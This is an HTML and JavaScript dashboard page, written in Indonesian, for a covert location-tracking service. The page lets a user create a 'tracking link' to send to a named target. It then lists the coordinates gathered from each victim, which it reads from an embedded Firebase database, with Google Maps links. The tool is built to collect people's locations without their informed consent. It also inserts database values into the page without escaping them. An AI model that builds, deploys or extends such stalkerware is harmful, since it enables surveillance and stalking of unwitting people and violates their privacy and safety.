<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dashboard</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #f0f2f5; }
    .box { background: white; padding: 20px; border-radius: 10px; margin-bottom: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
    input { width: 70%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
    button { padding: 10px 15px; background: #1877f2; color: white; border: none; border-radius: 5px; cursor: pointer; }
    .item { padding: 10px; border-bottom: 1px solid #eee; }
    a { color: #1877f2; word-break: break-all; }
    #logout { background: #e74c3c; float: right; }
  </style>
</head>
<body>
  <div class="box">
    <button id="logout" onclick="logout()">Logout</button>
    <h2>Halo, <span id="u"></span> 👋</h2>
    <p>Buat link pelacak, kirim ke target:</p>
    <input id="target" placeholder="Nama target (misal: budi)">
    <button onclick="genLink()">Buat Link</button>
    <p id="link" style="margin-top:15px"></p>
  </div>

  <div class="box">
    <h3>📍 Lokasi Masuk</h3>
    <div id="hasil">Menunggu data...</div>
  </div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
  authDomain: "roraxbali-65802.firebaseapp.com",
  databaseURL: "https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "roraxbali-65802",
  storageBucket: "roraxbali-65802.firebasestorage.app",
  messagingSenderId: "750633313866",
  appId: "1:750633313866:web:3d2e552960e06db83968b3"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const user = localStorage.getItem('username');
if (!user) location.href = 'index.html';
document.getElementById('u').innerText = user;

function logout() {
  localStorage.removeItem('username');
  location.href = 'index.html';
}
window.logout = logout;

function genLink() {
  const target = document.getElementById('target').value.trim() || 'target';
  const base = location.origin + location.pathname.replace('dashboard.html', '');
  const url = `${base}track.html?u=${encodeURIComponent(user)}&t=${encodeURIComponent(target)}`;
  document.getElementById('link').innerHTML = 
    `Link target:<br><a href="${url}" target="_blank">${url}</a>`;
}
window.genLink = genLink;

onValue(ref(db, 'lokasi/' + user), snap => {
  const data = snap.val();
  if (!data) {
    document.getElementById('hasil').innerText = 'Belum ada lokasi masuk.';
    return;
  }
  const arr = Object.values(data).sort((a,b) => b.waktu - a.waktu);
  document.getElementById('hasil').innerHTML = arr.map(d => `
    <div class="item">
      <b>${d.target || 'target'}</b> — ${new Date(d.waktu).toLocaleString('id-ID')}<br>
      📌 ${d.lat}, ${d.lng}<br>
      🗺️ <a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">Buka di Google Maps</a>
    </div>
  `).join('');
});
</script>
</body>
</html>
